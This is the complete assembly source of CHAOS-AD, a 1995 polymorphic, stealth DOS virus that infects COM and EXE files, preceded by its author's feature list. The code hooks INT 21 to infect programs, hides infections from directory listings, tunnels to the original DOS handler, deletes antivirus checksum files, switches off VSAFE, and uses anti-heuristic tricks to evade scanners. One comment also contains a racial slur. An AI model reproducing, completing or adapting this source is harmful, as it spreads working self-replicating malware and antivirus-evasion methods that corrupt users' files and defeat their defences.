comment ~

*****************************
*** CHAOS-AD by Sepultura ***        
*** South Australia - '95 ***
*****************************
	
Polymorphic, Full(ish) Stealth, Retro, Anti-Heuristic, Tunneling, COM+EXE.

*** IMPORTANT ***

This is the OFFICIAL version... due to a bit of a mistake, I sent a few ppl
on #virus the wrong version which has a TINY (one line) bug :P

******************

********
FEATURES:
********
Personal Stuff: - My First Polymorphic Virus.
		- My First Full Stealth Virus.
		- My First EXE infector.

Retro Stuff:    - Deletes CHKLIST.CPS, CHKLIST.MS, ANTI-VIR.DAT files.
		- Avoids infecting AV programs.
		- Disables VSAFE.
		- Avoids VSAFE, and older versions of TBMEM, from reporting
		  changes to System Memory / Environment.

Anti-Heuristics:- Uses some fairly heav Anti-Heuristic structures throughout.
		- TCE generates HUGE, spaced out Decryptors, avoiding # flag.
		- TBSCAN 6.50 finds 0 flags on DECRYPTED virus.
		- F-PROT( /paranoid) 2.19 finds nothing on DECRYPTED virus.
		- AVP 2.2 finds nothing on DECRYPTED virus.
		- About 10% of decryptors are flagged by TBSAN HR 
							 (high heuristics).
		- No Decryptors (as far as i know) flagged by AVP, F-Prot.

Tunneling:      - Uses a /<-R4D NEW (I think) method to find the original 
		  INT 21 vector.. see the subroutine find_21 for more info..

Polymorphy:     - Polymorphy is provided by TCE-0.4 (The Chaos Engine).
		
		It can generate decryptors of the form:
		   ADD/SUB/ADC/SBB/XOR [BP/SI/DI/BX(+xx(xx))],reg16

		It can move a value to a register as such:
		   MOV reg,VAL
		or LEA reg,[VAL]
		or XOR/SUB reg,reg + OR/XOR/ADD reg,VAL
		or XOR/SUB reg,reg + SUB reg, negative VAL

		It can test for a zero value, using:
		   OR/AND/TEST reg,reg
		
		It can generate the following looping methods:
		   JNZ loopstart
		or CLC + JA loopstart
		or LOOP loopstart
		or LOOPNZ loopstart

		It can modify the KEY register, using:
		   ADD/SUB/XOR reg,xxxx

		- Although TCE is a stand alone engine, I do not really 
		  expect other people to use it in their virii, mainly
		  because it sux, and there are many better engines around.
	 
Stealth:        - This is probably the shittiest part of the virus!
		- I could not get FULL (disinfect on the fly) type stealth
		  working with the variable length poly, and size padding,
		  so for now I am using Disinfect on Open, Infect on Close
		  type stealth.
		- It also Disinfects files loaded by debuggers.
		- If an archiver is running, it Infects instead of Disinfect.

Other Stuff:    - Marks files by padding the size up, so that the Least
		  Significant Byte, of the Size field, is ADh (chaos-AD).
		  This is reliable, and doesn't cause anything suspicious
		  looking..
		- Has a Cool Activation Routine (see the sub-routine 
		  setup_activator for more info).

Things That Delayed This Viruses Progress:
		- Drugs.
		- School.
		- Stupidity.
		- I couldn't stop playing that 'Dont Touch The Sides' game
		  in VLAD-#3 (and i still cant :P).

~
	radix   16

_rip            equ     014

sft_open_mode   equ     W[di+02]
sft_size_low    equ     W[di+11]
sft_size_hi     equ     W[di+13]
sft_point_low   equ     W[di+15]
sft_point_hi    equ     W[di+17]
sft_file_name   equ     W[di+20]
sft_file_ext    equ     W[di+28]

v_length        equ     (offset end - offset start)
mem_length      equ     (v_length + 0f) / 10


	org     0

start:  sti                                     ;Cleanup after decryptor.
	cld

	push    ds
	
						;Check if Resident. I made
	call    check_if_res                    ;this a call, as I also use
						;it to get the Delta-offset.
delta_offset:        
	je      installed_b
	
	mov     cl,0c1                          ;This is code to test for XTs
	mov     ax,1                            ;if an XT is running, AX=0
	shl     ax,cl                           ;because it gets shifted 
	test    ax,ax                           ;a helluva lot..
installed_b:
	if z    jmp installed
	
	call    find_21
	mov     ax,5800
	int     21   
	push    ax
	mov     ax,5801
	push    ax
	mov     bx,0082                 ;Stratagie = Use Last Block, try UMBs
	int     21                      ;first...
	mov     ax,5802
	int     21
	mov     ah,0
	push    ax
	mov     ax,5803
	push    ax
	mov     bl,1
	int     21
	mov     ah,48                   ;Allocate it...
	mov     bx,mem_length
	int     21
	push    ax
	dec     ax
	mov     ds,ax
	mov     W[1],8                  ;Mark as DOS..
	pop     es
	pop     ax
	pop     bx
	int     21
	pop     ax
	pop     bx
	int     21
	
	mov     ds,cs
	mov     cx,v_length
	push    si
	call    _movsb
	pop     si
	
	mov     ds,es
	mov     es,cx
	mov     di,4b0
	mov     virus_cs,ds                     ;Set Segment to JMP to,
						;from INT 21 handler in 
						;BIOS area.

	push    si                              ;Copy Anti-Trace code into
	mov     si,offset bios_21_handler       ;unused BIOS area.. (0:4b0) 
	mov     cx,(offset int_21_handler - bios_21_handler)+1
	call    _movsb                          ;Anti-Heuristic movsb..
	pop     si

	mov     bx,21
	mov     di,bx
	call    get_int                         ;Get Current INT 21 vector..
	mov     int_21_off,bx
	mov     int_21_seg,es
	
	mov     ax,4b0                          ;Set INT 21 vector to 0:4b0.
	cwd
	call    set_int
						
	inc     W generation                    ;64th generation?
	and     W generation,3f                 ;prepare to activate if it 
	if z    call setup_activator            ;is..
						;$$$$ change the last 3f to
						;0 to see the activation 
						;routine quickly.
						
						;This causes VSAFE, and older
	mov     ax,4b00                         ;Versions of TBMEM to save
	int     21                              ;the state of the current
						;environment, avoiding stuff
						;like the 'System Memory Has
						;Been Modified' warning.

						

installed:
	cmp     sp,1000 - 2                     ;File is EXE?
	je      restore_exe                     ;then resore it as EXE
	
	pop     ds                              ;else restore as COM
	
	mov     di,100
	push    di
	add     si,offset first_2
	mov     es,cs
	mov     cx,5                            ;restoring 5 bytes
	call    _movsb                          ;whilst avoiding heuristics.
	call    zero_regs                       ;clean-up after ourselves..
	ret

restore_exe:                                    ;Restore form .EXE
	pop     ax                              ;AX=original DS
	mov     es,ax
	add     ax,10
	
	mov     ds,cs
	
	xchg    bp,ax
	add     ax,[si+sexe_ss]   
	cli                       
	mov     ss,ax                           ;restore SS:SP
	mov     sp,[si+sexe_sp]   
	sti                       
	xchg    bp,ax

	add     ax,[si+ret_cs]
	push    ax                              ;PUSH CS
	push    W [si+ret_ip]                   ;PUSH IP
	
	mov     ds,es                           ;DS=ES=orig DS
	
	call    zero_regs                       ;tidy up..
	retf                                    ;back to da start..

sexe_ss                 dw      0
sexe_sp                 dw      0
ret_ip                  dw      0
ret_cs                  dw      0

check_if_res:                                   ;check if res/
	xor     di,di                           ;get delta offset
	mov     ds,di                           ;DS=0
	mov     bp,sp
	mov     si,[bp]                         ;si=return of call off stack
	sub     si,offset delta_offset          ;  = delta offset
	cmp     B[4b0],9c                       ;0:4b0=PUSHF? 
	ret


bios_21_handler:                                ;This Handler is Placed at
	pushf                                   ;0:4b0. It runs some code
	push    ax                              ;that uses the stack to try
	xor     ax,ax                           ;and determine whether the
	push    ax                              ;INT 21 call is being traced,
	pop     ax                              ;and if it is not, JMPs to 
	dec     sp,2                            ;the virus INT 21 handler,
	pop     ax                              ;otherwise it returns with an
	or      ax,ax                           ;IRET. Because INT 21 now
	pop     ax                              ;points to 0:4b0, it also 
	jz      not_traced                      ;stops programs like Proview
	popf                                    ;form saying INT 21 points to
	iret                                    ;a suspicious area of RAM.
		
not_traced:     db      0ea                     ;JMP to proper Virus INT 21
		dw      offset int_21_handler   ;handler..
virus_cs        dw      0                       ;This is patched to the virus
						;CS..

int_21_handler:                                 ;The Proper INT 21 handler.
	push    ax

	xchg    ah,al                           ;CMP AL,xx is shorter, and
						;avoids heuristics
	
	cmp     ax,004b                         ;Infect on Execute...
	je      infect_ds_dx
	cmp     al,43                           ;Infect on Attribute Mod..
	je      infect_ds_dx

	cmp     al,3e                           ;Infect on Close..
	je      infect_bx

	cmp     al,6c                           ;Disinfect on Extended Open..
	je      disinfect_ds_si

	cmp     al,3d                           ;Disinfect on Open..
	je      disinfect_ds_dx
	cmp     al,4b                           ;Disinfect on Load (by Debug)
	je      disinfect_ds_dx

	cmp     al,11                           ;Size stealth on Find First
	je      size_fcb
	cmp     al,12                           ;and Find Next
	je      size_fcb

	cmp     al,4e                           ;Size Stealth on DTA Find 1st
	je      size_dta
	cmp     al,4f                           ;and DTA Find Next
	je      size_dta

exit_int_21a:
	pop     ax
	popf

next_21:                
		db      0ea
int_21_off      dw      0
int_21_seg      dw      0

size_dta:
	jmp     i_roq

infect_bx:
	pop     ax
	popf

	pusha
	push    es,ds
	call    is_caller_arc
	jc      blah
	call    infect_open_file
	jmp     short blahha
blah:   call    close_file
blahha: pop     ds,es
	popa
	retf    2

infect_ds_dx:
	pusha
	push    es,ds

do_infect:
	call    infect
	jmp     short exit_id

disinfect_ds_si:
	pusha
	mov     dx,si
	db      0a8

disinfect_ds_dx:
	pusha
	
do_disinfect:                           ;Disinfect file at DS:DX
	push    es,ds
	call    is_caller_arc           ;If call made by Archiver, Infect
	jc      do_infect               ;instead..
	
	call    disinfect

exit_id:pop     ds,es
	popa
	jmp     short exit_int_21a
	     
size_fcb:
	pop     ax
	
	push    cs
	call    next_21

	pushf
	pusha
	push    ds,es
	or      al,al
	jnz     exit_size_fcb_b

	call    is_caller_ass                   ;Exit if Anti-Size Stealth
	jc      exit_size_fcb_b                 ;program..

	
	mov     al,2f
	call    i21

	mov     ds,es
	cmp     B[bx],0ff
	if e    add bx,7
	lea     si,[bx+1]
	
	mov     es,cs
	mov     di,offset fcb_name
	cld
	mov     cx,8

	call    fcb_name_loop
	mov     al,'.'
	stosb

	dec     si
	add     si,cx
	mov     cx,3

	call    fcb_name_loop

put_null:
	mov     al,0
	stosb
	
	mov     dx,offset fcb_name
	mov     di,bx
	cmp     B[bx+1d],0AD
	jne     exit_size_fcb_b

	call    set_int_24
	
	mov     es,ds
	mov     ds,cs
	call    open_file
	jc      exit_size_fcb
	scasw
	scasb
	jmp     s_s_same

exit_size_fcb:
	call    restore_24

exit_size_fcb_b:
	pop     es,ds
	popa
	popf
	retf    2      

fcb_name_loop:
	lodsb
	cmp     al,20
	je      ret
	stosb
	loop    fcb_name_loop
	ret

disinfect:                              ;Disinfect DS:DX
	call    open_file
	if c    ret
	xchg    bx,ax
	mov     ds,cs
	cld
	
	call    set_int_24
	call    get_sft
	call    make_it_open
	
	mov     cx,-1
	mov     dx,-6
	mov     ax,242
	call    i21

	cmp     al,0AD-6                ;Infected?
	jne     exit_disinfect
	

	mov     cx,6
	mov     dx,offset s_s_buf
	call    read_file
	jc      exit_disinfect

	cmp     W s_s_buf,0CA05
	jne     exit_disinfect
	push    W s_s_buf[4]
	push    W s_s_buf[2]

	mov     cx,-1
	mov     dx,-6-1c
	mov     ax,242
	call    i21

	mov     dx,offset first_2
	mov     cx,1c
	push    cx,dx
	
	call    read_file
	call    seek_to_start
	
	pop     dx,cx
	call    write_file
	
	pop     dx,cx
	mov     ax,0042
	call    i21
	
	mov     cx,0
	call    write_file
	
exit_disinfect:
	call    close_file_b
	call    restore_24
	ret

infect: call    open_file
	jc      ret
	xchg    bx,ax

infect_open_file:
	mov     ds,cs
	cld
	call    set_int_24

	call    get_sft
	cmp     es:sft_file_ext[1],'MO' ;*.?OM
	je      is_executable
	cmp     es:sft_file_ext[1],'EX' ;*.?XE
	jne     bad_name

is_executable:
	mov     dx,es:sft_file_name
	mov     cx,8
	mov     si,offset evil_names    ;Dont infect AV / Command.com / Bait

name_check:
	lodsw
	cmp     ax,dx
	loopne  name_check
	jne     name_is_kewl

bad_name:
	jmp exit_infect
	
name_is_kewl:
	call    make_it_open
	
	call    seek_to_start
	
	mov     cx,1c
	mov     dx,offset first_2
	call    read_file
	jc      bad_name

	call    seek_to_end        
	
	cmp     al,0AD                  ;If Size = ??AD, file is already 
	if e    jmp exit_infect         ;infected..
	
	mov     B is_exe,1
	mov     cx,W first_2
	xor     cl,ch
	cmp     cl,'M' xor 'Z'
	je      check_exe
	
	mov     B is_exe,0
	
	or      dx,dx
	jnz     bad_name

	cmp     ax,0feff - v_length - 190
	ja      bad_name
	jmp     short is_big_enuf

check_exe: 
	pusha
	push    es        
	mov     es,ds
	mov     si,offset exe_ss
	mov     di,offset sexe_ss
	cld
	movsw
	movsw
	lodsw
	movsw
	movsw
	pop     es
	popa
	
	cmp     dx,000e
	ja      bad_name
	or      dx,dx
	jnz     is_big_enuf
	cmp     ax,1388
	jb      bad_name

is_big_enuf:
	mov     orig_size_hi,dx
	mov     orig_size_low,ax
			
	add     ax,100
	mov     W jmp_buffer,ax
	
ih8sp:  in      al,40
	and     al,7
	cmp     al,4
	je      ih8sp
	
	mov     si,offset jmp_buffer - 1
	and     B[si],NOT 7
	and     B[si+4],NOT 7
	
	or      B[si],al
	or      B[si+4],al


	pusha                   ;Calling The Chaos Engine
	push    ds,es
	
	mov     ds,cs
	xor     di,di           ;ES:DI = encryption buffer
	xor     si,si           ;DS:SI = Code
	mov     cx, v_length    ;CX = Length of Code
	push    0be00
	pop     es
	cmp     es:[di],720
	je      free_video
	stc
	jmp     short no_free_video

free_video:
	mov     dx,W jmp_buffer
	xor     ax,ax
	cmp     is_exe,1
	jne     poly_com    
	mov     ax,4            ;add CS: if EXE
	and     dx,0f           ;Delta offset = 0 if EXE

poly_com:
	call    tce
	call    write_file
	
	pushf
	mov     cx,v_length / 2
	mov     ax,720
	rep     stosw
	popf

no_free_video:
	pop     es,ds
	popa

	if c    jmp exit_infect
	
	call    seek_to_end
	
	mov     cx,ax
	mov     al,0AD-1c-6             ;Length of File will = ??AD (marker)
	cmp     ax,cx                   ;after six bytes containing original
	adc     ah,0                    ;are written to End of File..
	adc     dx,0
	xchg    dx,ax
	xchg    cx,ax
	mov     ax,0042
	call    i21
	push    ax

	mov     cx,1c
	mov     dx,offset first_2
	call    write_file
	mov     cx,6
	mov     dx,offset save_size_buf
	call    write_file

	pop     ax
	cmp     is_exe,1
	je      do_exe

	call    seek_to_start
	
	mov     ds,cs
	mov     dx,offset jmp_buffer-1
	mov     cx,5
	call    write_file
	jmp     exit_infect

do_exe: cmp     W exe_first_reloc_item,40 
	je      is_overlay
	cmp     W exe_overlay_num,0
	jz      not_overlay

is_overlay:
	jmp     exit_infect
	
not_overlay:
	cmp     W exe_max_mem_paras,0ffff
	jne     is_overlay

	mov     si,W orig_size_hi
	mov     cx,W orig_size_low

	mov     ax,W exe_total_pages
	mov     cx,200
	mul     cx                 
	cmp     dx,si             
	jb      is_overlay
	cmp     ax,cx             
	jb      is_overlay
	
	mov     ax,W orig_size_low
	mov     dx,W orig_size_hi
	
	mov     cx,10
	div     cx

	sub     ax,W exe_header_paras
	mov     W exe_cs,ax
	mov     W exe_ip,dx            ;DX = Delta Offset

	add     ax,20
	mov     W exe_ss,ax
	mov     W exe_sp,1000
	
	add     ax,1a
	cmp     W exe_min_mem_paras,ax   
	if ng   mov W exe_min_mem_paras,ax
	
	call    seek_to_end
	mov     cx,200
	div     cx    
	inc     ax              
	mov     W exe_total_pages,ax 
	mov     W exe_last_page_bytes,dx 

	call    seek_to_start
	
	mov     dx,offset first_2
	mov     cx,1c 
	call    write_file

exit_infect:
	call    close_file_b
	
	call    restore_24
	ret

i_roq:
	pop     ax
	
	push    cs
	call    next_21

	pushf
	pusha
	push    ds,es
	jc      exit_size_dta_b
	
	call    is_caller_ass
	jc      exit_size_dta_b
	
	

	mov     al,2f
	call    i21
	mov     ds,es
	
	mov     di,bx
	lea     dx,[di+1e]
	cmp     B[di+1b],0AD
	jne     exit_size_dta_b

	call    set_int_24
	
	call    open_file
	jc      exit_size_dta

	mov     es,ds
	mov     ds,cs
	
s_s_same:
	xchg    bx,ax
	mov     cx,-1
	mov     dx,-6
	mov     ax,0242
	call    i21

	mov     dx,offset s_s_buf
	mov     cx,6
	call    read_file
	jc      exit_size_dta
	
	call    close_file

	cmp     W s_s_buf,0ca05
	jne     exit_size_dta

	mov     si,offset s_s_buf+2
	add     di,1a
	movsw
	movsw

exit_size_dta:
	call    restore_24

exit_size_dta_b:
	pop     es,ds
	popa
	popf
	retf    2      

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; SUB - ROUTINES               ;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

Int_24_handler:                                 ;The INT 24 handler, to avoid
	mov     al,3                            ;Write Protect Errors.
	iret

;*********************************************
;*********************************************
;*** Check This Funky Routine Out Nigger!! ***
;*********************************************
;*********************************************

;This is the Funky NEW (I think) method to tunnel for the original INT 21
;handler! Heres What it Does:

;1. It hooks INT 2A, which is called by DOS on all DOS calls (below AH=6C)

;2. It issues a DOS call to Restore the INT 2A vector! This looks like it 
;   has hooked it, and then simply just set it back again.. completely harm-
;   less!

;3. The INT 2A vector gets the Return CS:IP of the stack, and uses this to
;   scan for the entry point to the DOS kernel.

find_21:mov     ds,cs
	
	mov     ax,352a                 ;Save original INT 2A vector.
	int     21
	mov     i2a_off[si],bx
	mov     i2a_seg[si],es
	push    es,bx

	mov     ah,25                   ;Set INT 2A to the New INT 2A vector.
	push    ax
	lea     dx,offset int_2a_handler[si]    ;SI=delta offset
	int     21

	pop     ax,dx,ds                ;Restore INT 2A vector..
	int     21
	ret                             ;and return..

int_2a_handler:
	pushf
	pusha
	push    es
	mov     bp,sp 
	
	call    delta2                  ;Get Delta offset
delta2: pop     si
	les     di,bp[_rip]             ;ES:DI = return address, off stack.
	std                             ;Search Backwards..
	mov     al,0FA                  ;Look for CLI (DOS entry point).

try_again:
	scasb
	jne     try_again
	
	inc     di                      ;DI=Entry point.
	mov     cs:i21o[si-offset delta2],di    ;Save Offset
	mov     cs:i21s[si-offset delta2],es    ;Save Segment

	pop     es
	popa
	popf

	db      0ea                     ;And Continue..
i2a_off dw      0
i2a_seg dw      0


;;;;;;;;;;;;;;;;;;;;;
;;File IO routines..

open_file:
	mov     ax,003d
	jmp     short i21

close_file_b:
	or      es:B[di+6],40           ;This preserves Time and Date stamp..

close_file:
	mov     al,3e
	db      0a9

write_file:
	mov     al,40
	db      0a9

read_file:
	mov     al,3f
	
	
i21:    xchg    ah,al           ;call tunneled INT 21
	pushf                   ;XCHG AH,AL for Anti-Heuristics..
	db      09a
i21o    dw      0
i21s    dw      0
	ret

seek_to_end:
	mov     ah,02
	db      0a9
seek_to_start:
	mov     ah,00
	mov     al,42
	xor     cx,cx
	cwd
	jmp     short i21

	
get_int:shl     bx,2    ;Returns ES:BX holding 32 bit vector of
	push    0       ;the interrupt in BX.
	pop     es
	les     es:bx,[bx]
	ret

restore_24:
	push    bx
	call    restore_vsafe
	pop     bx

	mov     di,24
	mov     ax,0
	org     $-2
int_24_off      dw      0

	mov     dx,0
	org     $-2
int_24_seg      dw      0


set_int:cld
	shl     di,2    ;Sets the Interrupt in DI to point to
	push    es      ;DX:AX.
	push    0
	pop     es
	stosw
	xchg    dx,ax
	stosw
	pop     es
	ret

get_sft:push    bx      ;Get the SFT, avoiding Heursitic Flags
	mov     ax,NOT 1220
	not     ax
	int     2f
	mov     bl,es:[di]
	mov     ax,NOT 1216
	not     ax
	int     2f
	pop     bx
	ret

make_it_open:
	and     es:W sft_open_mode,NOT 1
	or      es:W sft_open_mode,2
	ret

zero_regs:      
	mov     cx,8
zrl:    push    0
	loop    zrl
	popa
	sahf
	ret

set_int_24:
	pusha
	push    ds,es
	
	mov     ds,cs
	mov     bx,24
	mov     di,bx
	call    get_int
	mov     int_24_off,bx
	mov     int_24_seg,es
	mov     dx,cs
	mov     ax,offset int_24_handler
	call    set_int
	
	call    turn_off_vsafe
	
	mov     di,27
kill_next:
	lea     dx,[di+offset files_to_kill-0d]
	mov     ax,0143   
	xor     cx,cx
	call    i21
	mov     al,41     
	call    i21
	sub     di,0d
	jnz     kill_next
	
	pop     es,ds
	popa
	ret

get_caller:
	push    bx
	mov     al,62
	call    i21
	dec     bx
	mov     es,bx
	mov     di,8
	mov     ax,es:[di]
	pop     bx
	ret

is_caller_ass:
	pusha
	push    ds,es
	call    get_caller
	mov     es,cs
	mov     di,offset no_s_s
	mov     cx,0e
	cld
	repne   scasw
	je      set_c
	jmp     short clr_c

is_caller_arc:
	pusha
	push    ds,es
	call    get_caller   
	mov     es,cs
	mov     di,offset no_f_s
	mov     cx,08
	cld
	repne   scasw
	je      set_c

clr_c:  pop     es,ds
	popa
	clc
	ret

set_c:  pop     es,ds
	popa
	stc
	ret

_movsb: lodsb
	stosb
	loop    _movsb
	ret

turn_off_vsafe:                 ;Anti-Vsafe Shit..
	xor     bl,bl
	db      0a9
restore_vsafe:
	mov     bl,0
		
		org     $-1
old_vsafe               db      0


	pusha
	mov     ax,0fa02
	mov     dx,5945
	int     16              
	mov     cs:old_vsafe,cl
	popa
	ret

setup_activator:                ;This sets up a TSR to execute the activator
	pusha                   ;when appropriate. It hooks INT 9 and hooks
	push    ds,es           ;INT 2F. The actual activator is run, when
				;these handlers either see that 256 keys have
	mov     bx,2f           ;been pressed, or when windows is run..
	mov     di,bx           ;These handlers are only installed when the
	call    get_int         ;64th generation of the Virus is run.
	mov     i2f_off,bx
	mov     i2f_seg,es      ;See what the activation routine looks like
				;make the modifications where you see the
	mov     dx,ds           ;$$$$ marker.. making these modifications
	mov     ax,offset int_2f_handler        ;will cause it to activate
	call    set_int         ;on any generation, when 5 keys are pressed.

	
	mov     dx,ds
	mov     bx,9
	mov     di,bx
	call    get_int
	mov     i9_off,bx
	mov     i9_seg,es

	mov     B keys_pressed,0        ;$$$$ change the 0 to -5 to see the
					;activation quicker..
	mov     ax,offset int_9_handler
	call    set_int

	pop     es,ds
	popa
	ret

int_9_handler:
	pushf
	cli
	inc     cs:B keys_pressed
	if z    call activator
	popf

	db      0ea
i9_off  dw      0
i9_seg  dw      0

int_2f_handler:
	pushf
	cmp     ax,1605
	if e    call activator
	popf

	db      0ea
i2f_off dw      0
i2f_seg dw      0


activator:        
	cld
	pusha
	push    ds,es

	mov     ds,cs

	mov     ax,3
	int     10
	

	mov     dx,080c
	call    set_pos
	mov     si,offset msg1
	call    print_string
	
	mov     dx,090c
	call    set_pos
	mov     si,offset msg2
	call    print_string
	mov     bp,28

www:    mov     si,offset word1

wwww:   mov     dx,0b23
	call    set_pos
	call    print_string
	cmp     si,offset word2
	jae     www
	dec     bp
	jnz     wwww
	
wwwww:  mov     ax,3
	int     10
	pop     es,ds
	popa
	ret

print_string:
	lodsb
	mov     ah,0e
	int     10
	cmp     al,7
	jbe     ret
	jmp     short print_string

set_pos:mov     ah,2
	mov     bh,0
	int     10
	ret

msg1:   db      '- [CHAOS-AD] - CODED BY SEPULTURA - AUSTRALIA - 1995 -',0
msg2:   db      '-=> LIVING-IN-A-DYING-AGE-PERSECUTE-THE-HUMAN-RACE <=-',0

word1:  db      'REFUSE  ',7
	db      'RESIST  ',7
	db      'RELOVE  ',7
	db      'REMATE  ',7
	db      'SUFFER  ',7
	db      'REHATE  ',7
	db      'REJECT  ',7
	db      'PROGRESS',7
	db      'PROCESS ',7
	db      'PROTEST ',7
	db      'NO REST ',7
word2:  

files_to_kill:          db      'CHKLIST.MS',0,0,0
			db      'CHKLIST.CPS',0,0
			db      'ANTI-VIR.DAT',0


evil_names:             db      'CO','F-','AV','-V','TB','VI','00','VB'
no_s_s:                 db      'CH','SC','DE','ND','SP','PR'
no_f_s:                 db      'AR','PK','RA','UC','LH','ZI','UU','IV'

generation              dw      0

is_exe                  db      0

keys_pressed            db      0

			db      0b8
jmp_buffer              dw      0
			jmp     ax

save_size_buf           dw      0CA05   ;CHAOS
orig_size_low           dw      0
orig_size_hi            dw      0

fcb_name:
first_2                 dw      20cd
exe_last_page_bytes     dw      0
exe_total_pages         dw      0
			dw      0
exe_header_paras        dw      0
exe_min_mem_paras       dw      0
exe_max_mem_paras       dw      0
exe_ss                  dw      0
exe_sp                  dw      0
s_s_buf                 dw      0
exe_ip                  dw      0
exe_cs                  dw      0
exe_first_reloc_item    dw      0
exe_overlay_num         dw      0

include                 tce.asm

end:



